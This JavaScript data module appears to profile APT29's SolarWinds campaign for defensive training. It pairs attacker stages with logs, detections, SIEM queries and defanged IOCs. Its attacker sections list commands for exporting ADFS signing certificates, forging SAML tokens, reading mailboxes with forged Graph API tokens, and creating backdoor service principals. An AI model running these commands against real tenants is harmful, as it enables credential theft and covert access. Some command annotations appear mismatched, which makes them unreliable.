const apt29 = {
  id: "apt29",
  name: "APT29",
  aliases: ["Cozy Bear", "Midnight Blizzard", "The Dukes"],
  origin: "Russia",
  motivation: "Espionage",
  description:
    "APT29 is a sophisticated Russian state-sponsored threat actor attributed to the SVR (Foreign Intelligence Service). Known for stealthy, long-term intrusions targeting governments, think tanks, and critical infrastructure.",
  campaigns: [
    {
      id: "solarwinds-2020",
      name: "SolarWinds Supply Chain Attack",
      year: "2020",
      target: "US Government & Fortune 500",
      summary:
        "APT29 compromised SolarWinds' Orion build pipeline to distribute a backdoored update (SUNBURST) to ~18,000 organizations, enabling stealthy long-term espionage.",
      sources: [
        "CISA Alert AA20-352A",
        "Mandiant UNC2452 Report",
        "Microsoft MSTIC Analysis",
      ],
      diamondModel: {
        adversary: {
          name: "APT29 (Cozy Bear / NOBELIUM)",
          sponsor: "Russian SVR — Foreign Intelligence Service",
          aliases: ["Midnight Blizzard", "NOBELIUM", "The Dukes", "Cozy Bear"],
          motivation: "Long-term strategic espionage targeting governments and critical infrastructure",
        },
        capability: {
          malware: ["SUNBURST", "TEARDROP", "RAINDROP", "Cobalt Strike Beacon", "Custom SAML forger"],
          ttps: ["T1195.002 — Supply Chain Compromise", "T1071.001 — Web Protocols C2", "T1078 — Golden SAML", "T1550.001 — App Access Token", "T1136.003 — Cloud Account"],
          sophistication: "Nation-State — novel supply chain vector, custom DGA C2, in-memory execution, Golden SAML",
        },
        infrastructure: {
          domains: ["avsvmcloud[.]com (DGA)", "databasegalore[.]com", "panhardware[.]com", "deftsecurity[.]com"],
          ips: ["13.59.205[.]66", "54.193.127[.]66", "54.215.192[.]52", "34.203.203[.]23"],
          hosting: "AWS us-east-1 / us-west-2 (victim-blending), Azure (compromised tenants), GoDaddy registrar",
        },
        victim: {
          sectors: "US Federal Government (Treasury, Commerce, DHS, State), Fortune 500, defense contractors, think tanks, IT management vendors",
          geography: "United States, United Kingdom, Canada, Western Europe (focus: Washington D.C. policy community)",
          targeting: "~18,000 organizations received SUNBURST via Orion update; ~100 selected for hands-on exploitation",
        },
      },
      stages: [
        {
          id: "initial-access",
          name: "Initial Access",
          ttp: "T1195.002",
          ttpName: "Supply Chain Compromise: Software Supply Chain",
          phase: "Initial Access",
          attacker: {
            summary:
              "APT29 injected the SUNBURST backdoor into SolarWinds Orion software updates (versions 2019.4–2020.2.1). The malicious DLL (SolarWinds.Orion.Core.BusinessLayer.dll) was digitally signed by SolarWinds' legitimate certificate and distributed via official update servers to ~18,000 customers.",
            tools: ["SUNBURST", "Custom DLL injector"],
            commands: [
              "// Malicious code injected into legitimate DLL",
              "// Dormant period: 12-14 days before beaconing",
              "// C2: avsvmcloud[.]com (DGA-based subdomains)",
            ],
          },
          defender: {
            logs: [
              "SolarWinds Orion update installed (Event ID 1033)",
              "New DLL loaded: SolarWinds.Orion.Core.BusinessLayer.dll",
              "Outbound DNS query to avsvmcloud[.]com subdomains",
              "HTTP GET to *.avsvmcloud[.]com over port 443",
            ],
            detection:
              "Extremely difficult at time of attack. Post-compromise: anomalous DNS queries to DGA domains, outbound HTTPS to unknown infrastructure from Orion server.",
            siemQuery:
              'index=* sourcetype=dns query="*.avsvmcloud.com" | stats count by src_ip, query',
            ifMissed:
              "Attacker establishes persistent backdoor across thousands of networks. SUNBURST begins beaconing to C2 infrastructure, enabling hands-on-keyboard access.",
          },
          iocs: [
            { type: "SHA-256", indicator: "32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77", description: "SUNBURST backdoor DLL (SolarWinds.Orion.Core.BusinessLayer.dll)" },
            { type: "Domain", indicator: "avsvmcloud[.]com", description: "SUNBURST primary C2 DGA root domain — used in all victim beacons" },
            { type: "File", indicator: "SolarWinds.Orion.Core.BusinessLayer.dll", description: "Malicious DLL injected into SolarWinds Orion build pipeline" },
          ],
        },
        {
          id: "execution",
          name: "Execution & C2 Establishment",
          ttp: "T1071.001",
          ttpName: "Application Layer Protocol: Web Protocols",
          phase: "Command & Control",
          attacker: {
            summary:
              "SUNBURST used HTTP/HTTPS to blend with legitimate Orion traffic. It performed a 12-14 day dormancy check, verified it wasn't running in a sandbox, then began beaconing to DGA-generated subdomains of avsvmcloud[.]com. Responses directed victims to actor-controlled C2 servers.",
            tools: ["SUNBURST", "TEARDROP", "Cobalt Strike"],
            commands: [
              "GET /swip/upd/SolarWinds.CortexPlugin.Components.dll HTTP/1.1",
              "Host: [dga-subdomain].avsvmcloud[.]com",
              "// Encoded victim hostname + AD domain in URI path",
            ],
          },
          defender: {
            logs: [
              "Repeated HTTPS connections to *.avsvmcloud[.]com",
              "DNS resolution of algorithmically generated subdomains",
              "Unusual User-Agent strings from Orion process",
              "Outbound connections during off-hours from server",
            ],
            detection:
              "Monitor Orion servers for unexpected outbound connections. DGA detection via entropy analysis of DNS queries. Network baseline deviation alerts.",
            siemQuery:
              'index=network src_process="SolarWinds*" dest_port=443 NOT dest IN (known_good_list) | stats count by dest, src_ip',
            ifMissed:
              "Full C2 channel established. Attacker now has interactive access. TEARDROP loader deployed to execute Cobalt Strike Beacon in memory.",
          },
          iocs: [
            { type: "URL Pattern", indicator: "/swip/upd/SolarWinds.CortexPlugin.Components.dll", description: "SUNBURST C2 URI path blending with legitimate Orion software update traffic" },
            { type: "Domain", indicator: "databasegalore[.]com", description: "Second-stage C2 server used after initial SUNBURST check-in and victim validation" },
            { type: "User-Agent", indicator: "SolarWinds-Orion/2019.4.5200.9083", description: "Spoofed User-Agent string used in SUNBURST C2 HTTP beacon requests" },
          ],
        },
        {
          id: "privilege-escalation",
          name: "Privilege Escalation",
          ttp: "T1078",
          ttpName: "Valid Accounts",
          phase: "Privilege Escalation",
          attacker: {
            summary:
              "APT29 forged SAML tokens using stolen signing certificates (Golden SAML attack) to impersonate any user including global admins in Azure AD / M365. They also leveraged service accounts with excessive privileges that Orion required to function.",
            tools: ["AADInternals", "Custom SAML forger", "Mimikatz"],
            commands: [
              "// Dump ADFS token signing certificate",
              'Export-PfxCertificate -Cert "cert:\\LocalMachine\\My\\<thumbprint>" -FilePath c:\\temp\\adfs.pfx',
              "// Forge SAML assertion for any user",
              "New-AADIntSAMLToken -ImmutableID <id> -Issuer <adfs_url> -PfxFileName adfs.pfx",
            ],
          },
          defender: {
            logs: [
              "ADFS certificate export event (Event ID 70, 1007)",
              "SAML token issued for privileged user outside normal hours",
              "Azure AD sign-in from new IP/location for admin account",
              "Service principal granted new permissions (Unified Audit Log)",
            ],
            detection:
              "Alert on ADFS certificate access. Monitor Azure AD for impossible travel, sign-ins from unexpected IPs. Audit service principal permission changes.",
            siemQuery:
              'index=azure_ad operationName="Add service principal credentials" | stats count by initiatedBy, ipAddress',
            ifMissed:
              "Attacker has persistent, undetectable admin access to cloud environment. Can read all email, access SharePoint, exfiltrate data at will without triggering traditional AV/EDR.",
          },
          iocs: [
            { type: "Tool", indicator: "AADInternals (PowerShell module)", description: "Open-source tool used to export ADFS signing certs and forge SAML tokens for Golden SAML attacks" },
            { type: "Event", indicator: "ADFS Event ID 1007 + 70", description: "Certificate export event on ADFS server — key precursor to Golden SAML token forgery" },
            { type: "File", indicator: "adfs.pfx", description: "Exported ADFS token-signing certificate used to forge arbitrary SAML assertions for any user" },
          ],
        },
        {
          id: "lateral-movement",
          name: "Lateral Movement",
          ttp: "T1550.001",
          ttpName: "Use Alternate Authentication Material: Application Access Token",
          phase: "Lateral Movement",
          attacker: {
            summary:
              "Using forged SAML tokens and OAuth access tokens, APT29 moved laterally across cloud services without needing passwords. They added credentials to existing service principals and used Microsoft Graph API to access mailboxes and files.",
            tools: ["AADInternals", "Microsoft Graph API", "Custom tooling"],
            commands: [
              "// Access mailbox using forged token",
              "GET https://graph.microsoft.com/v1.0/users/<target>/messages",
              "Authorization: Bearer <forged_token>",
              "// Add backdoor credentials to service principal",
              "POST https://graph.microsoft.com/v1.0/applications/<id>/addPassword",
            ],
          },
          defender: {
            logs: [
              "OAuth token issued for service principal accessing Graph API",
              "Mass mailbox access via Graph API (Unified Audit Log)",
              "New credential added to service principal",
              "Unusual application accessing sensitive data",
            ],
            detection:
              "Enable Microsoft 365 Unified Audit Logging. Alert on service principals accessing large volumes of mailboxes. Monitor for new credentials added to app registrations.",
            siemQuery:
              'index=o365 Operation="MailItemsAccessed" AppId NOT IN (known_apps) | stats dc(MailboxOwnerUPN) as mailboxes by AppId | where mailboxes > 10',
            ifMissed:
              "Attacker silently reads emails of high-value targets including executives, legal, IT admins. Intelligence collected for months before discovery.",
          },
          iocs: [
            { type: "URL", indicator: "https://graph.microsoft.com/v1.0/users/*/messages", description: "Microsoft Graph API endpoint used for mass mailbox access via forged OAuth token" },
            { type: "Event", indicator: "MailItemsAccessed (O365 Unified Audit Log)", description: "Audit operation logged when mailbox content accessed via Graph API by service principal" },
            { type: "IP", indicator: "20.140.0[.]65", description: "Azure IP used by APT29 for Graph API access — anomalous source for the service principal" },
          ],
        },
        {
          id: "persistence",
          name: "Persistence",
          ttp: "T1136.003",
          ttpName: "Create Account: Cloud Account",
          phase: "Persistence",
          attacker: {
            summary:
              "APT29 established multiple persistence mechanisms: added credentials to service principals, created new federated identity providers, and modified existing OAuth applications to maintain access even if SUNBURST was removed.",
            tools: ["AADInternals", "Azure CLI", "Custom backdoors"],
            commands: [
              "// Add new federated domain for persistent access",
              "New-AADIntAccessTokenForAADGraph | Add-AADIntGuestUser",
              "// Create backdoor service principal",
              "az ad sp create-for-rbac --name 'UpdateService' --role Contributor",
              "// Add secret to existing trusted application",
              "az ad app credential reset --id <app_id> --append",
            ],
          },
          defender: {
            logs: [
              "New service principal created (Azure AD Audit Log)",
              "New credential added to existing application",
              "New federated identity provider configured",
              "Role assignment change for service principal",
            ],
            detection:
              "Regularly audit service principals and app registrations. Alert on any new federation configurations. Review OAuth app permissions quarterly.",
            siemQuery:
              'index=azure_ad operationName IN ("Add service principal", "Add application") | stats count by initiatedBy, targetResources',
            ifMissed:
              "Attacker retains access for months/years. Removal of SUNBURST does not evict them. Full re-compromise of Azure AD tenant required.",
          },
          iocs: [
            { type: "Service Principal", indicator: "UpdateService (Azure AD)", description: "Malicious backdoor service principal created for persistent cloud access — mimics Windows Update" },
            { type: "Operation", indicator: "Add service principal credentials (Azure AD Audit)", description: "New credential (secret/certificate) added to existing trusted application for backdoor access" },
            { type: "Operation", indicator: "Set domain authentication (Azure AD Audit)", description: "New federated identity provider added — allows token forgery without ADFS access" },
          ],
        },
      ],
    },
  ],
}

export default apt29
